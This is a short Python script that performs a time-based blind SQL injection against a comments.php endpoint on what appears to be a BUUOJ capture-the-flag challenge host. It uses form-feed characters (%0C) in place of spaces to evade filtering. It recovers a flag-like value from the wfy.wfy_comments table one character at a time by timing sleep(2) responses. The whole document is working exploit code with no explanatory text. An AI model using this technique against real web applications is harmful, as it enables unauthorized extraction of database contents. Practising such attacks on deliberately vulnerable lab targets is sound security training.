import requests
#from urllib.parse import unquote
import datetime


urlOPEN = "http://7bc91eb2-dddf-4e91-8f47-2bd680262e8c.node4.buuoj.cn:81/comments.php?name=1%0Cand%0Cif(mid((select%0Ctext%0Cfrom%0Cwfy.wfy_comments%0Climit%0C11,1),"
#urlOPEN=unquote(urlOPEN)

def get_data():
      
  name = ''   
  for j in range(31, 40):
    for i in 'sqcwertyuioplkjhgfdazxvbnm0123456789_{}':
        url = urlOPEN + "%d,1)='%c',sleep(2),0)"% (j,i)
        time1 = datetime.datetime.now()
        r = requests.get(url)
        time2 = datetime.datetime.now()
        sec = (time2 - time1).seconds
        if sec >= 2:
                name += i
                print(name)
                break   

get_data()
